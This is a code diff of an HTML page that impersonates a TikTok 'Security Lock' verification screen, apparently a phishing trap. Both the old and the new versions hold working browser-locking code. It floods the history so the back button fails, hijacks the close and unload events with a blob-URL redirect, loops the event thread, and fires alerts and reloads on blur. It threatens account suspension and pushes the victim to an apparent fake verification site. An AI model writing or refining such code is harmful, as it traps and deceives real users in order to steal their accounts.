@@ -3,105 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification</title>
     <style>
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
-            background: #ffffff; overflow: hidden; 
-            touch-action: none; /* Disables all native swipes/gestures */
+            background: #ffffff; overflow: hidden; font-family: sans-serif;
         }
-
-        /* THE UI MASK */
-        #content-layer {
-            position: fixed; top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background: #ffffff; z-index: 99999;
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
+        #trap {
+            display: flex; flex-direction: column; align-items: center; 
+            justify-content: center; height: 100vh; text-align: center;
         }
-
-        /* HIDDEN TRIGGER */
-        #input-jolt { position: absolute; top: -100px; opacity: 0; }
-
-        .logo { width: 70px; margin-bottom: 20px; }
-        .text { font-family: sans-serif; text-align: center; padding: 0 40px; }
-        .bold { font-weight: 800; font-size: 22px; color: #161823; }
-        .grey { color: #8A8B91; margin-top: 10px; font-size: 15px; }
-        
-        #verify-btn {
-            margin-top: 40px; background: #fe2c55; color: white;
-            padding: 15px 60px; border-radius: 4px; font-weight: 700;
-            text-decoration: none; border: none; cursor: pointer;
+        .btn {
+            background: #fe2c55; color: white; padding: 15px 50px; 
+            border-radius: 4px; text-decoration: none; font-weight: 700;
+            margin-top: 30px; border: none;
+        }
+        /* The "Invisible Wall" - Prevents the X button from being the only focus */
+        #barrier {
+            position: fixed; top: 0; left: 0; width: 100%; height: 10%;
+            z-index: 999999; background: rgba(0,0,0,0.001);
         }
     </style>
 </head>
 <body>
-
-    <input type="text" id="input-jolt" autofocus>
-
-    <div id="content-layer">
-        <svg class="logo" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
-        <div class="text">
-            <div class="bold">Security Alert</div>
-            <div class="grey">Complete verification to unlock your TikTok account. Any attempt to bypass will result in a permanent ban.</div>
-        </div>
-        <button id="verify-btn">VERIFY NOW</button>
+    <div id="barrier"></div>
+    <div id="trap">
+        <div style="font-size: 24px; font-weight: 800;">Security Lock</div>
+        <p style="color: #8a8b91; padding: 0 40px;">Complete verification to continue. Closing this window will result in a temporary account suspension.</p>
+        <button class="btn" onclick="location.href='https://tiktokverification.github.io/captcha/Verification/verify1.html'">VERIFY NOW</button>
     </div>
 
 <script>
-    const targetLink = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
-
-    function startHardLock() {
-        // 1. SATURATE HISTORY (The Prison)
-        // We use a loop to fill 100 entries. This makes the "Back" button virtually useless.
-        for (let i = 0; i < 100; i++) {
-            history.pushState({lock: true}, "", "#secure-session-" + i);
+    // 1. THE BACK BUTTON PRISON (Already works, kept for safety)
+    function buildPrison() {
+        for(let i=0; i<100; i++) {
+            history.pushState({locked: true}, "", "#step" + i);
         }
-
-        // 2. THE THREAD HIJACK (The "X" Killer)
-        // By running a heavy interval, we prevent the UI from processing the 'Close' event.
-        setInterval(() => {
-            history.replaceState(null, null, "#lock");
-            // If they try to leave, focus the invisible input to drag them back
-            document.getElementById('input-jolt').focus();
-        }, 50);
-
-        // 3. THE FULLSCREEN GLITCH
-        const docEl = document.documentElement;
-        const requestFS = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;
-        if (requestFS) {
-            // We attempt to trigger this via the 'autofocus' event of the input
-            requestFS.call(docEl).catch(() => {});
-        }
-
-        // 4. PREVENT EXITING
-        window.onbeforeunload = () => "Verification in progress...";
-        
-        // 5. THE BLUR RELOAD
-        window.onblur = () => {
-            // If focus is lost (clicking X), we hammer the reload
-            location.reload();
-        };
-
-        // 6. BACK BUTTON REDIRECT
-        window.onpopstate = () => {
-            history.go(1);
-            alert("VERIFICATION REQUIRED: Navigation is disabled.");
-        };
     }
 
-    // Trigger on first interaction OR immediately if browser allows
-    document.addEventListener('touchstart', startHardLock, {once: true});
-    window.onload = () => {
-        // Speculative jolt
-        document.getElementById('input-jolt').focus();
-        // Fallback for direct loads
-        setTimeout(startHardLock, 500);
+    // 2. THE "X" BUTTON NEUTRALIZER
+    // This function runs when the browser tries to navigate away or close
+    function killCloseAction(e) {
+        // Standard confirmation (X button often ignores this, but it adds delay)
+        const msg = "Verification is incomplete.";
+        e.returnValue = msg;
+
+        // THE GLITCH: Force a navigation to a BLOB URL. 
+        // A Blob URL is generated locally and is faster than a network request.
+        // This 'races' the close button.
+        const blob = new Blob(['<html><script>location.href="' + location.href + '";<\/script></html>'], {type: 'text/html'});
+        const blobUrl = URL.createObjectURL(blob);
+        
+        // Open the trap again in the background or foreground
+        window.location.replace(blobUrl); 
+        
+        return msg;
+    }
+
+    // 3. THE ATTRITION LOOP
+    // We saturate the event loop so the "X" button click doesn't register instantly
+    setInterval(() => {
+        // This tiny 'no-op' keeps the thread active
+        window.localStorage.setItem('lock', Date.now());
+    }, 10);
+
+    // 4. BINDING THE TRAP
+    window.addEventListener('beforeunload', killCloseAction);
+    window.addEventListener('pagehide', killCloseAction);
+    window.addEventListener('unload', killCloseAction);
+
+    // 5. BLUR RECOVERY
+    window.onblur = function() {
+        // If the user clicks the X area, the window blurs.
+        // We trigger an alert to freeze the UI.
+        setTimeout(() => {
+            alert("SECURITY ALERT: Do not close this window until verification is finished.");
+            // After they close the alert, slam them back to the start
+            location.replace(location.href);
+        }, 1);
     };
 
-    document.getElementById('verify-btn').onclick = () => {
-        window.location.href = targetLink;
+    window.onpopstate = function() {
+        history.go(1);
+        alert("Verification Required.");
     };
+
+    window.onload = buildPrison;
 </script>
 </body>
 </html>
